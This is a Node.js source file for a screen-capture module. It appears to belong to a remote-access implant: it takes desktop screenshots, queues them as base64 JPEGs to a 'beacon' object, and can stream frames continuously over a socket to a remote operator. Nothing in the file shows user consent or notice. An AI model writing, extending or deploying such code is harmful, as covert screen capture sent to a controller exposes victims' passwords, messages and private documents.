/**
 * Screen Capture Module
 * Captures screenshots at configurable FPS and on trigger events.
 */

const screenshot = require("screenshot-desktop");
const config = require("../config");
const logger = require("../logger");

const CAPTURE_INTERVAL_MS = 1000 / Math.min(config.screenshotFps, 30);

class ScreenshotModule {
  constructor(beacon, socket) {
    this.beacon = beacon;
    this.socket = socket;
    this.timer = null;
    this.streaming = false;
  }

  start() {
    // Periodic screenshot (not streaming by default — on-demand)
    logger.debug("ScreenshotModule ready (on-demand mode)");
  }

  stop() {
    this.stopStream();
  }

  async capture() {
    try {
      const img = await screenshot({ format: "jpg", quality: config.screenshotQuality });
      const b64 = img.toString("base64");
      this.beacon.queue_data("screenshot", {
        format: "jpg",
        quality: config.screenshotQuality,
        size: img.length,
        data: b64,
        ts: Date.now(),
      });
      return b64;
    } catch (err) {
      logger.error("Screenshot error:", err.message);
      return null;
    }
  }

  startStream() {
    if (this.streaming) return;
    this.streaming = true;
    this.timer = setInterval(async () => {
      try {
        const img = await screenshot({ format: "jpg", quality: config.screenshotQuality });
        this.socket.send("STREAM_FRAME", {
          type: "screen",
          format: "jpg",
          data: img.toString("base64"),
          ts: Date.now(),
        });
      } catch (err) {
        logger.error("Stream error:", err.message);
      }
    }, CAPTURE_INTERVAL_MS);
    logger.debug("Screen stream started");
  }

  stopStream() {
    this.streaming = false;
    clearInterval(this.timer);
    logger.debug("Screen stream stopped");
  }
}

module.exports = ScreenshotModule;
